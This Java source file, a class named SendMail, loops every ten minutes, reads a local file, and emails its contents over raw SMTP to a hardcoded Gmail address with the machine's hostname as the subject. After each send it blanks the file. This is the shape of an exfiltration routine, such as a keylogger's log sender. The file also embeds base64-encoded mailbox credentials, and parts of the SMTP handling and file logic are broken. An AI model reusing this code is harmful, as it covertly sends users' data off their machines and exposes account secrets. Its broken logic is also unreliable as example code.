package gmail.smtp.dungvan;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.UnknownHostException;

import javax.swing.JOptionPane;

public class SendMail {

	private BufferedReader _in, _in2;
	private PrintWriter _out;
	
	private static String sourcePath = "";

	protected void send(String s) throws java.io.IOException {
		// Send the SMTP command
		if (s != null) {
			_out.println(s);
			_out.flush();
		} else
			_out.flush();
		_in.readLine();
	}
	
	public static String getSourcePath(){
		sourcePath = System.getProperty("user.dir");
		return sourcePath;
	}
	
	public SendMail(){
		
	}

	public void sendMail(String _from, String _to, String _subject, String file,
			String content) {
		String data = "";
		if (file != null && !file.equals("")) {
			data += "Content-Type: text/plain; name=\"" + file
					+ "\"\nContent-Disposition : attachment; filename = \"data.txt\"\n";
			File f = new File(file);
			try {
				f.createNewFile();
				_in2 = new BufferedReader(new InputStreamReader(
						new FileInputStream(file), "UTF-8"));
				String line = null;
				while ((line = _in2.readLine()) != null) {
					data += line + "\n";
				}
				_in2.close();
				
				FileWriter fw = new FileWriter(f, false);//ghi ри data trong file
				fw.write("");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		try {
			String email = "ZHVuZ3ZhbjI1MTJAZ21haWwuY29t";
			String pass = "dGhhbnZ1MTIzNA==";

			java.net.Socket s = new java.net.Socket("smtp.gmail.com", 587);
			_out = new PrintWriter(s.getOutputStream());
			_in = new BufferedReader(
					new java.io.InputStreamReader(s.getInputStream()));

			send("EHLO " + java.net.InetAddress.getLocalHost().getHostName());
			_in.readLine();
			_in.readLine();
			_in.readLine();
			_in.readLine();
			_in.readLine();
			_in.readLine();
			_in.readLine();
			send("STARTTLS false");
			send("AUTH LOGIN");
			send(email);
			send(pass);
			send("MAIL FROM: <" + _from + ">");
			send("RCPT TO: <" + _to + ">");
			send("DATA");
			_out.println("Subject:" + _subject);
			_out.println(data);
			send(".");
			send("QUIT");
			_in.close();
			_out.close();
			s.close();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public static void main(String[] args) {
		if (args.length > 2) {
			String subject = (String) args[0];
			String file = (String) args[1];
			String data = (String) args[2];
		}
		
		while (true) {
			
			try {
				Thread.sleep(600000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				SendMail sm = new SendMail();
				sm.sendMail("dungvan2512@gmail.com", "dungvan2512@gmail.com",
						InetAddress.getLocalHost().getHostName(), SendMail.getSourcePath(), "save me!");
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
